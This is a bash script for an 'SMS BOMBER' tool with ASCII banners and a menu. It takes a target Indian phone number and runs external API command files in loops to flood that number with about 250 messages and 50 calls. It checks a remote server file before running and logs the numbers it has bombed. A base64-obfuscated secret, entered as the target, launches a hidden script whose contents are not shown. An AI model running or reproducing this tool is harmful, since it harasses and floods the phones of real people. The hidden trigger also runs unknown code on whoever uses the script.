#!/bin/bash
#------------------------------------------------------#
#                   SMS BOMBER v 3.1 !                 #
#               Coded by SHAIK AFRID                   #
#~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ #
#      Github     :   github.com/afridanon             #
#                                                   #
#------------------------------------------------------#
# Colors FG
RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"
echo "INSTALLING MODULES PLESE WAIT !"
apt-get install -y git curl wget pv
just() {
clear
echo ""
echo ""
printf  "     \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
}
banner() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92m AFRID \e[1;97m█████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1.2
echo -e "     This is\e[1;0m Shaik Afrid" | pv -qL 150
echo "            Afrid !" | pv -qL 150
echo ""
echo -e "$GREEN Ethical Hacker$WHITE |$GREEN CyberSec$WHITE |$GREEN Programmer" | pv -qL 10
echo ""
printf "\e[0m\e[92m Group Admin at$WHITE SHAIK AFRID\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA My social media are below !!" | pv -qL 10
echo ""
printf "\e[0m\e[92m Github \e[0m\e[91m     : \e[0m\e[96mgithub.com/afridanon\e[0m\n" | pv -qL 50
echo ""
echo ""
echo -e "\e[1;91m                 Happy Hacking :)" | pv -qL 10
sleep 7
echo ""
}
rm .server.txt > /dev/null 2>&1
wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt    > /dev/null 2>&1
serverup="On"
server=$(cat .server.txt | grep On)
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo ""
sleep 1
echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
echo ""
exit
exit
exit
fi
bombrecord() {
clear
echo ""
echo "$WHITE       █▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ 　  █▀▀█ █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀▄ "
echo "$GREEN       █▀▀▄ █░░█ █░▀░█ █▀▀▄ 　  █▄▄▀ █▀▀ █░░ █░░█ █▄▄▀ █░░█ "
echo "$WHITE       █▄▄█ ▀▀▀▀ ▀   ▀ ▀▀▀  　  █  █ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀▀▀ "
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}
PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..
SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
for i in {1..5}
do SECRET=$(echo $SECRET | base64 --decode)
done
eexec() {
echo "Under construction"
exit
}
menu() {
clear
echo " $GREEN █▀ █▀▄▀█ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█"
echo " $GREEN ▄█ █░▀░█ ▄█   █▄█ █▄█ █░▀░█ █▄█ ██▄ █▀▄"
echo ""
sleep 2
printf "\e[1;92m[\e[0m SHAIK AFRID\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
if [[ $targett = $SECRET ]]
then
bash .notyourbusiness.sh
else
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
echo ""
echo "$RED 🇦​​​​​🇫​​​​​🇷​​​​​🇮​​​​​🇩​​​​​🇦​​​​​🇳​​​​​🇴​​​​​🇳​​​​​"
sleep 2
echo ""
printf "  ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min\e[93m"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
echo ""
while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}
for i in {1..4}
do bash headapis
done
for i in {1..27}
do bash tailapis
done
exit 
fi
}
menux() {
clear
clear
sleep 1
banner
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool was made only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m SMS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "2" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using sms_bomb !\e[93m"
        echo ""
        exit
else
        menux
fi
}
menux
